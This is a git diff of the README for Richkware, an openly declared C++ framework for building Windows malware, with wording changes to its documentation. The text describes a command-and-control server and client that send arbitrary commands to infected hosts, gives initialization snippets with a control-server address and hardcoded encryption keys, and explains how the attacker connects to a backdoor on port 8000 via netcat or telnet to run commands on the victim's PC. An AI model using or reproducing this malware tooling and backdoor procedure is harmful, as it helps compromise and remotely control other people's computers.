@@ -6,9 +6,8 @@ Framework for building Windows malware, written in C++.
 
 ## Description
 
-It's a library of network and OS functions, that you can use to create malware.
-The composition of these functions permits the application 
-to assume behaviors referable to the following types of malware:
+Richkware is a library of network and OS functions, that you can use to create malware.
+The composition of these functions permits the application to assume behaviors referable to the following types of malware:
 
 - Virus
 - Worms
@@ -19,9 +18,9 @@ to assume behaviors referable to the following types of malware:
 
 ## Related Projects
 
-[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server): Service for management of hosts where is present a malware developed using **Richkware** framework.
+[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server): Service for the management of hosts in which is present an instance of malware developed using **Richkware** framework.
 
-[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client): Client of **Richkware-Manager-Server**, that obtains list of all hosts and is able to send commands to do at each of them.
+[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client): Client of **Richkware-Manager-Server**, that it obtains the list of all hosts from the server and it's able to send any kind of commands to them.
 
 ![](http://richk.altervista.org/RichkwareDiagram.svg)
 
@@ -77,27 +76,27 @@ These are the base requirements to build and use Richkware:
 - [MinGW](http://www.mingw.org/)
 
 ## Get Started
-Open main.cpp, and create instance of Richkware.
+Open main.cpp, and create an instance of Richkware.
 ### With [Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)
-if you deployed [RMS](https://github.com/richkmeli/Richkware-Manager-Server), you could use:
+If you have deployed [RMS](https://github.com/richkmeli/Richkware-Manager-Server), you can initialize the malware as follows:
 
         int main() {
-               Richkware richkware("Richk","DefaultPassword","192.168.99.100", "8080", "userAssociated");
+               Richkware richkware("Richk","DefaultPassword","192.168.99.100", "8080", "associatedUser");
                 ...
                 return 0;
             }
         
-that get secure key from Richkware-Manager-Server and set it as encryption key.
-DefaultPass is used as temporary encryption key to ensure a safety communication with RMS and if this app cannot reach the RMS, then it will use DefaultPass as encryption key.
+that it gets a secure key from Richkware-Manager-Server and it sets the key as encryption key.
+**DefaultPass** is used as temporary encryption key to ensure a secure communication with RMS and if the malware cannot reach the RMS for getting its encryption ket, it will use DefaultPass as encryption key.
 
 
 ### Without [Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)
 
-Else, if you didn't deploy [RMS](https://github.com/richkmeli/Richkware-Manager-Server), you could use: 
+Otherwise, if you haven't deployed [RMS](https://github.com/richkmeli/Richkware-Manager-Server), you can use: 
          
      Richkware richkware("Richk","richktest");
          
- it uses "richktest" as encryption key.
+ in this way, it uses "richktest" as encryption key.
      
 
 
@@ -114,10 +113,13 @@ After **main.cpp** implementation, you can compile as follows.
 - Linker > Input > Additional Dependencies, add "Ws2_32.lib"
 
 ## Examples of usage
+In the following example, we call "**server**", a malware developed using Richkware framework and in which it has been enabled the function for creating a server, and "**client**", the creator(Hacker) of the malware that is trying to establish a connection with the infected PC.
 
-### Remotely Command Execution
+###Server-side
 
-Call function **StartServer** in the main, it starts server on port 8000.
+#### Remotely Command Execution
+
+Call framework function **StartServer** in the main, it starts server on a port, in the following example is the TCP port 8000. Remember that if a port is already used by another program, you can't use that port, until the program will be stopped.
 
 	int main () {
 	    ...
@@ -125,29 +127,30 @@ Call function **StartServer** in the main, it starts server on port 8000.
         ...
 	}
 
-### Connect using [Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)
-In all systems where the Java Virtual Machine is installed, you can use [Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)
+###Client-side
 
-### Connect using terminal in Unix systems
+#### Connect using [Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)
+In all systems where the Java Virtual Machine is installed, you can use [Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client), otherwise if it's not present you can easily use a terminal.
 
-In Unix systems, you can use **netcat**.
+#### Connect using terminal in Unix systems
+
+In Unix systems, you can use **netcat**, and run the following command:
 
 	nc <serverName> 8000
 	
-after the answer from the server about establishment of connection, write:
+if the server received the request on the open port and it succeeds to create a connection, it responses to the client confirming the establishment of the connection, after that, you can write:
     
     [[1]]COMMAND
     
-where COMMAND is the command to execute to the pc where server is running.
+where *COMMAND* is a command that has to be executed on the infected host where server is running.
 
-### Connect using terminal in Windows
+#### Connect using terminal in Windows
 
-In Windows, you can use **telnet**.
+In Windows, you can use **telnet**, in the same way:
 
 	telnet <serverName> 8000
 
-after the answer from the server about establishment of connection, write:
+...
     
     [[1]]COMMAND
     
-where COMMAND is the command to execute to the pc where server is running.
